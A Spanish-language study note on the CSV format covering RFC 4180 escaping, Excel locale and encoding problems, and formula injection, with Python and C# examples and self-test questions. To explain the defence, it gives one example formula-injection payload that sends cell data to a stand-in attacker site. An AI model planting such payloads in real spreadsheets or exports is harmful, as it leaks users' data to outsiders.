---
proyecto: Conocimiento
tipo: concepto
nivel: basico
progreso: pendiente
estado: pendiente
area: Fundamentos
tags: [fundamentos]
contenido: completo
---
# CSV

Parte de: [[02-Fundamentos/06 Datos y formatos/_Índice Datos y formatos|Datos y formatos]]

> [!info] Cómo avanzar
> `progreso`: **pendiente** → **viendo** (estudiando) → **visto** (contestaste la autoevaluación sin abrir las respuestas) → **dominado** (hiciste el laboratorio o lo aplicaste de verdad).

## Contenido

### Qué es
**CSV** (Comma-Separated Values) es un formato de texto para **datos tabulares**: una fila por línea y los campos separados por comas. Es el formato de intercambio más universal para datos de hojas de cálculo, exportaciones de reportes y cargas masivas. Parece trivial, pero tiene reglas de escape que hay que respetar; la referencia es el **RFC 4180**, aunque muchas herramientas (Excel incluido) tienen sus propias variantes.

### Cómo funciona
Reglas del RFC 4180:
1. Cada registro en su línea, terminada en CRLF (en la práctica también se acepta LF).
2. Primera línea opcional de encabezados.
3. Campos separados por coma.
4. Un campo que contiene **coma, comillas dobles o salto de línea** va **entre comillas dobles**.
5. Las comillas dobles **dentro** de un campo entrecomillado se **duplican**: `"` → `""`.

Ejemplos:

| Valor original | En CSV |
|---|---|
| `Monterrey, NL` | `"Monterrey, NL"` |
| `Ana "La Jefa"` | `"Ana ""La Jefa"""` |
| `Pérez, "Pepe"` | `"Pérez, ""Pepe"""` |
| Texto con salto de línea | `"Línea 1` ⏎ `Línea 2"` (el salto queda dentro de las comillas) |

La fila completa para nombre `Ana "La Jefa"`, ciudad `Monterrey, NL` y monto `100`:

```text
"Ana ""La Jefa""","Monterrey, NL",100
```

Y la línea `1,"x""y",,3` tiene **4 campos**: `1`, `x"y`, un campo vacío y `3`.

Por estas reglas **nunca se parsea con `split(',')`**: una coma dentro de comillas o un salto de línea dentro de un campo rompen todo. Usa siempre una librería.

**Excel y México.** Excel abre un CSV con doble clic usando la **configuración regional de Windows**:
- El **separador de listas** regional define qué separador espera. Si la configuración del usuario usa `;` (común con formatos de Europa o configuraciones personalizadas), tu archivo con comas aparece **todo en una columna**.
- Si el archivo es UTF-8 **sin BOM**, Excel puede interpretarlo como la codificación ANSI de Windows y verás `PÃ©rez` en lugar de `Pérez` (ver [[UTF-8 y codificaciones]]).
- Mitigaciones: guardar en UTF-8 **con BOM**, agregar una primera línea `sep=,` (truco que Excel reconoce, pero que otras herramientas leen como dato), indicar al usuario que use *Datos > Desde texto/CSV*, o directamente **exportar XLSX**, que es lo que suele querer un usuario de negocio.

**Inyección de fórmulas (CSV injection).** Si un campo empieza con `=`, `+`, `-` o `@` (también tabulador o retorno de carro), Excel puede interpretarlo como **fórmula** al abrirlo. Un usuario malicioso registra su nombre como `=HYPERLINK("https://malo.com/?d="&A2,"Ver")` y cuando un administrador abre el reporte, la fórmula se ejecuta: puede filtrar datos o, en configuraciones antiguas, ejecutar comandos. Al **exportar datos ingresados por usuarios**, antepón una comilla simple `'` o un espacio a los campos que empiecen con esos caracteres, o neutralízalos.

### Ejemplo
Lectura correcta en Python con el módulo `csv`:

```python
import csv, io

texto = 'nombre,ciudad,monto\n"Ana ""La Jefa""","Monterrey, NL",100\n'
filas = list(csv.DictReader(io.StringIO(texto)))
print(filas[0])  # {'nombre': 'Ana "La Jefa"', 'ciudad': 'Monterrey, NL', 'monto': '100'}
```

Exportación en Wee.Reporteria con **CsvHelper** (librería .NET popular), UTF-8 con BOM y protección contra fórmulas:

```csharp
using CsvHelper;
using CsvHelper.Configuration;
using System.Globalization;
using System.Text;

static string Neutralizar(string? v) =>
    v is { Length: > 0 } && "=+-@\t\r".Contains(v[0]) ? "'" + v : v ?? "";

var config = new CsvConfiguration(CultureInfo.InvariantCulture) { Delimiter = "," };
await using var archivo = new StreamWriter("clientes.csv", false, new UTF8Encoding(encoderShouldEmitUTF8Identifier: true));
await using var csv = new CsvWriter(archivo, config);

csv.WriteField("Nombre"); csv.WriteField("Ciudad"); csv.WriteField("Monto"); await csv.NextRecordAsync();
foreach (var c in clientes)
{
    csv.WriteField(Neutralizar(c.Nombre));   // CsvHelper aplica comillas y duplicado de "" por ti
    csv.WriteField(Neutralizar(c.Ciudad));
    csv.WriteField(c.Monto);                  // InvariantCulture: punto decimal
    await csv.NextRecordAsync();
}
```

`InvariantCulture` garantiza punto decimal y formato estable, independientemente del servidor. Si el destino es un usuario de negocio que abrirá el archivo en Excel, considera generar **XLSX** (por ejemplo con ClosedXML), como ya hace Wee.Reporteria para sus reportes.

### Cuándo usarlo y cuándo no
- **Sí**: intercambio con otros sistemas, cargas masivas a bases de datos (`BULK INSERT`, `bcp`), exportaciones simples, datos para Python o Power BI.
- **No**: datos jerárquicos (usa JSON), archivos que el usuario final abrirá con formato, fórmulas o varias hojas (usa XLSX), o cuando no puedes acordar codificación y separador con el otro lado.

### Errores comunes
1. **Parsear con `split(',')`.** Se rompe con comas o saltos de línea en campos. Usa una librería.
2. **No escapar comillas** al generar. Archivos que ninguna herramienta lee bien.
3. **Codificación indefinida.** Acuerda UTF-8 (con BOM si es para Excel).
4. **Números con formato local** (`1.234,56` o separadores de miles). Usa formato invariante sin separador de miles.
5. **Exportar datos de usuarios sin neutralizar fórmulas.** Inyección de CSV.

### Para profundizar
- [RFC 4180: formato CSV](https://www.rfc-editor.org/rfc/rfc4180)
- [Documentación de Python: módulo csv](https://docs.python.org/3/library/csv.html)
- [OWASP: CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)

## Ejercicios

Resuélvelos en papel o en la herramienta; la solución está plegada.

> [!question]- Escribe la fila CSV para: nombre `Ana "La Jefa"`, ciudad `Monterrey, NL`, monto `100`.
> `"Ana ""La Jefa""","Monterrey, NL",100`

> [!question]- Lee correctamente un CSV con comas dentro de comillas en Python.
> ```python
> import csv, io
> filas = list(csv.reader(io.StringIO('a,"b,c",d\n')))
> print(filas)  # [['a', 'b,c', 'd']]
> ```
> Nunca uses `linea.split(',')`.

> [!question]- ¿Cuántos campos tiene la línea `1,"x""y",,3`?
> 4: `1`, `x"y`, (vacío), `3`.

## Autoevaluación

Contesta primero en voz alta o en papel; luego despliega la respuesta.

> [!question]- ¿Cómo se escapa un campo que contiene comas, comillas o saltos de línea?
> Se encierra en comillas dobles y las comillas internas se duplican: `"Pérez, ""Pepe"""` representa `Pérez, "Pepe"` (RFC 4180).

> [!question]- Excel en México abre tu CSV todo en una columna. ¿Por qué?
> Según la configuración regional, Excel puede esperar `;` como separador o no detectar UTF-8. Se mitiga con UTF-8 **con BOM**, la línea `sep=,` o exportando XLSX.

> [!question]- ¿Qué es la inyección de fórmulas en CSV?
> Si un campo empieza con `=`, `+`, `-` o `@`, Excel puede ejecutarlo como fórmula. Al exportar datos de usuarios se antepone `'` o se sanitizan esos caracteres.

